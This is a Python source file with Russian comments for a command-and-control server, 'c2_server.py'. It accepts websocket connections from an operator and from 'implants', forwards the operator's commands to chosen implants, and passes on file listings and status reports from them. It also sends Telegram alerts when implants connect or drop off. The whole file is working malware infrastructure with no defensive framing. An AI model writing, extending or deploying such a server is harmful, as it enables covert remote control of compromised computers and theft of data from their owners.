# --- Файл: c2_server.py (Версия 8.1 - С ТОТАЛЬНОЙ ТРАССИРОВКОЙ) ---
import asyncio
import json
import os
from aiohttp import web
from utils import send_telegram_message

# Глобальные переменные для хранения состояний
IMPLANTS, OPERATOR = {}, None

async def safe_send(ws, data):
    """Безопасно отправляет JSON, перехватывая ошибки отключения клиента."""
    if ws and not ws.closed:
        try:
            await ws.send_json(data)
            return True
        except (ConnectionResetError, asyncio.CancelledError):
            return False
    return False

async def broadcast_bot_list():
    """Безопасно транслирует список ботов оператору."""
    await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def websocket_handler(request):
    """Основной обработчик WebSocket-соединений."""
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        # Ждем первое сообщение для идентификации
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            client_id = "OPERATOR"
            print("[C2-TRACE] Оператор подключился.")
            await broadcast_bot_list()

        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id: raise ValueError("Имплант не предоставил ID")

            IMPLANTS[client_id] = {"ws": ws, "files": None, "volume": None}
            hostname = client_id.replace("implant_", "")
            print(f"[+] Имплант ОНЛАЙН: {hostname}")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {hostname}")
            await broadcast_bot_list()

        # Основной цикл обработки сообщений
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT and msg.data != 'pong':
                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    action = data.get('action')
                    print(f"[C2-TRACE] От оператора получена команда '{action}' для бота '{target_id}'")
                    if target_id in IMPLANTS:
                        print(f"[C2-TRACE] Пересылаю команду '{action}' боту '{target_id}'...")
                        await safe_send(IMPLANTS[target_id]["ws"], data)
                    else:
                        print(f"[C2-TRACE] ОШИБКА: Бот '{target_id}' не найден в списке активных.")

                elif client_type == 'implant':
                    print(f"[C2-TRACE] От импланта '{client_id}' получено сообщение типа '{data.get('type')}'")
                    if data.get('type') == 'bot_details':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get("files")
                            IMPLANTS[client_id]["volume"] = data.get("volume")
                            print(f"[C2-TRACE] Детали от '{client_id}' сохранены. Пересылаю оператору.")
                            await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': data})
                    elif data.get('type') == 'status':
                        print(f"[C2-TRACE] Статус от '{client_id}' пересылается оператору.")
                        await safe_send(OPERATOR, data)

    except Exception as e:
        print(f"[C2-ERROR] Критическая ошибка в сессии с {client_id}: {e}")
    finally:
        # Корректно обрабатываем отключение
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] Имплант ОТКЛЮЧИЛСЯ: {hostname}")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {hostname}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[C2-TRACE] Оператор отключился.")

    return ws

async def http_handler(request):
    """Отдает главную HTML-страницу."""
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    """Основная функция для запуска сервера."""
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V8.1 TOTAL TRACE) ONLINE ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nСервер остановлен.")
    finally:
        send_telegram_message("🛑 Сервер остановлен.")
